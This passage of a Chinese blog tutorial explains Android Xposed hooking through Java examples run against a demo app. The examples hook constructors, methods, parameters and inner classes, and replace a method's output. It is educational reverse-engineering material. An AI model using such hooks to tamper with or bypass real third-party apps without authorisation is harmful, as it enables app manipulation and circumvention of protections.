&#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;这是有参构造函数后&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>XposedHelpers.findAndHookConstructor(Class&lt;?&gt; clazz, Object… parameterTypesAndCallback)：hook构造方法，参数为clazz, new XC_MethodHook()，clazz为加载的类。这个hook构造方法的参数可以加xxx.class，指定hook方法的参数列表，xxx为构造函数中对应的参数类型。（参考如上图片解析）</li><li>XposedHelpers.findAndHookConstructor(‘类’，’参数列表’，new XC_MethodHook())</li><li>XC_MethodHook()方法输入后会跳出个弹窗，选中这两个。<img src="2025-01-15-Xposed框架/image-20230714181900369.png" alt="image-20230714181900369"></li></ul><p>然后在生成的beforeHookedMethod()，afterHookedMethod()方法内写逻辑就好</p><ul><li>param.args[0]：param是一个数组，param.args[0]指定参数的第一个数据。</li></ul><h3 id="执行结果-1"><a href="#执行结果-1" class="headerlink" title="执行结果"></a>执行结果</h3><ul><li>运行demo<br><img src="2025-01-15-Xposed框架/image-20230714182217127.png" alt="image-20230714182217127"></li></ul><h2 id="三-Hook普通-静态方法"><a href="#三-Hook普通-静态方法" class="headerlink" title="三.Hook普通/静态方法"></a>三.Hook普通/静态方法</h2><h3 id="目标：hook掉demo的普通方法"><a href="#目标：hook掉demo的普通方法" class="headerlink" title="目标：hook掉demo的普通方法"></a>目标：hook掉demo的普通方法<img src="2025-01-15-Xposed框架/image-20230714184958696.png" alt="image-20230714184958696"></h3><h3 id="代码实现如下-2"><a href="#代码实现如下-2" class="headerlink" title="代码实现如下"></a>代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;publicFunc&quot;</span>, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;publicFunc is hooked before&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;publicFunc is hooked after&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>XposedHelpers.findAndHookMethod(Class&lt;?&gt; clazz, String methodName, Object… parameterTypesAndCallback):hook普通方法，静态方法，具体使用方法和hook构造方法差不多。</li></ul><p>​        XposedHelpers.findAndHookMethod(‘类’，方法名，’参数列表’，new XC_MethodHook())</p><h3 id="执行结果-2"><a href="#执行结果-2" class="headerlink" title="执行结果"></a>执行结果</h3><p>运行demo<img src="2025-01-15-Xposed框架/image-20230714185618441.png" alt="image-20230714185618441"></p><h2 id="四-Hook复杂参数"><a href="#四-Hook复杂参数" class="headerlink" title="四.Hook复杂参数"></a>四.Hook复杂参数</h2><h3 id="目标：hook掉demo有多个参数的方法"><a href="#目标：hook掉demo有多个参数的方法" class="headerlink" title="目标：hook掉demo有多个参数的方法"></a>目标：hook掉demo有多个参数的方法</h3><p><img src="2025-01-15-Xposed框架/image-20230714212338332.png" alt="image-20230714212338332"></p><h3 id="代码实现如下-3"><a href="#代码实现如下-3" class="headerlink" title="代码实现如下"></a>代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;complexParameterFunc&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.String&quot;</span>,<span class="comment">//String.class</span></span><br><span class="line">                <span class="string">&quot;[[Ljava.lang.String;&quot;</span>, <span class="comment">//String[][].class</span></span><br><span class="line">                <span class="string">&quot;java.util.Map&quot;</span>,</span><br><span class="line">                Class.forName(<span class="string">&quot;java.util.ArrayList&quot;</span>), <span class="comment">//&quot;java.util.ArrayList&quot;</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;complexParameterFunc is hooked before&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;complexParameterFunc is hooked after&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里和上面hook普通方法一样，就是参数多了一些以及拓展了参数列表的表达方式：</p><ul><li>“java.lang.String”(String类路径)”&lt;==&gt;String.class</li><li>“[[Ljava.lang.String;”(String二维数组的smali形式)</li><li>Class.forName(“java.util.Map”)”java.util.Map”(Map包路径)&lt;==&gt;Map.class</li><li>Class.forName(“java.util.ArrayList”)&lt;==&gt;”java.util.ArrayList”&lt;==&gt;ArrayList.class</li></ul><h3 id="执行结果-3"><a href="#执行结果-3" class="headerlink" title="执行结果"></a>执行结果</h3><p>运行demo<br><img src="2025-01-15-Xposed框架/image-20230714220025533.png" alt="image-20230714220025533"></p><h2 id="五-Hook自定义类参数"><a href="#五-Hook自定义类参数" class="headerlink" title="五.Hook自定义类参数"></a>五.Hook自定义类参数</h2><h3 id="目标：hook掉demo中的自定义类参数的方法"><a href="#目标：hook掉demo中的自定义类参数的方法" class="headerlink" title="目标：hook掉demo中的自定义类参数的方法"></a>目标：hook掉demo中的自定义类参数的方法</h3><p><img src="2025-01-15-Xposed框架/image-20230715165947513.png" alt="image-20230715165947513"></p><h3 id="代码实现如下-4"><a href="#代码实现如下-4" class="headerlink" title="代码实现如下"></a>代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        <span class="comment">//方法一</span></span><br><span class="line">        Class aniclazz=loadPackageParam.classLoader.loadClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Animal&quot;</span>);</span><br><span class="line">        <span class="comment">//方法二</span></span><br><span class="line">        <span class="comment">//Class aniclazz=XposedHelpers.findClass(&quot;com.xiaojianbang.xposeddemo.Animal&quot;,loadPackageParam.classLoader);</span></span><br><span class="line">        <span class="comment">//方法三</span></span><br><span class="line">        <span class="comment">//Class aniclazz=Class.forName(&quot;com.xiaojianbang.xposeddemo.Animal&quot;,false,loadPackageParam.classLoader)</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;Inner&quot;</span>,</span><br><span class="line">                aniclazz,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;这是自定义类参数的hook&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里和前面也大差不差，主要就是多了一个自已定义的类，不能使用xxx.class方法了，这里使用先加载类，这里有三个方法：</p><ul><li>loadPackageParam.classLoader.loadClass(包+类名)：加载类</li><li>XposedHelpers.findClass(“包+类”,loadPackageParam.classLoader);</li><li>Class.forName(“包+类”,false,loadPackageParam.classLoader)</li></ul><h3 id="执行结果-4"><a href="#执行结果-4" class="headerlink" title="执行结果"></a>执行结果</h3><p>运行demo</p><p><img src="2025-01-15-Xposed框架/image-20230715172838293.png" alt="image-20230715172838293"></p><h2 id="六-Hook替换函数"><a href="#六-Hook替换函数" class="headerlink" title="六.Hook替换函数"></a>六.Hook替换函数</h2><h3 id="目标：hook掉一个方法的输出内容"><a href="#目标：hook掉一个方法的输出内容" class="headerlink" title="目标：hook掉一个方法的输出内容"></a>目标：hook掉一个方法的输出内容</h3><p><img src="2025-01-15-Xposed框架/image-20230715181604016.png" alt="image-20230715181604016"></p><h3 id="代码实现如下-5"><a href="#代码实现如下-5" class="headerlink" title="代码实现如下"></a>代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line"></span><br><span class="line">        XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;repleaceFunc&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam methodHookParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;xiaojianbang&quot;</span>,<span class="string">&quot;这是替换之后的输出&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>new XC_MethodReplacement():用来hook修改方法</li></ul><h3 id="执行结果-5"><a href="#执行结果-5" class="headerlink" title="执行结果"></a>执行结果</h3><p>运行demo，发现没有输出’this is repleaceFunc log’，hook成功<br><img src="2025-01-15-Xposed框架/image-20230715181924016.png" alt="image-20230715181924016"></p><h2 id="七-Hook内部类"><a href="#七-Hook内部类" class="headerlink" title="七.Hook内部类"></a>七.Hook内部类</h2><h3 id="目标：hook内部类，得到内部类中的实例对象"><a href="#目标：hook内部类，得到内部类中的实例对象" class="headerlink" title="目标：hook内部类，得到内部类中的实例对象"></a>目标：hook内部类，得到内部类中的实例对象</h3><p><img src="2025-01-15-Xposed框架/image-20230715191405906.png" alt="image-20230715191405906"></p><h3 id="代码实现如下-6"><a href="#代码实现如下-6" class="headerlink" title="代码实现如下"></a>代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">                XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader),</span><br><span class="line">                <span class="string">&quot;innerFunc&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        <span class="type">int</span> aa=XposedHelpers.getIntField(param.thisObject,<span class="string">&quot;innerPublicInt&quot;</span>);</span><br><span class="line">                        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;&quot;</span>+aa);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体还是使用XposedHelpers.findAndHookMethod()方法，但是参数变化了，因为现在是Demo$InnerClass类不再是原来的Demo类。</p><p>使用XposedHelpers.findClass方法加载类Demo$InnerClass</p><ul><li>XposedHelpers.getIntField(Object obj, String fieldName)：得到int型字段</li><li>param.thisObject：我们通过调用param对象的thisObject属性获取当前方法所属的类的实例</li></ul><h3 id="执行结果-6"><a href="#执行结果-6" class="headerlink" title="执行结果"></a>执行结果</h3><p>运行demo<br><img src="2025-01-15-Xposed框架/image-20230715195241921.png" alt="image-20230715195241921"></p><h2 id="八-主动调用"><a href="#八-主动调用" class="headerlink" title="八.主动调用"></a>八.主动调用</h2><h3 id="目标：hook主动调用"><a href="#目标：hook主动调用" class="headerlink" title="目标：hook主动调用"></a>目标：hook主动调用<img src="2025-01-15-Xposed框架/image-20230715213038516.png" alt="image-20230715213038516"></h3><h3 id="代码实现如下-7"><a href="#代码实现如下-7" class="headerlink" title="代码实现如下"></a>代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">                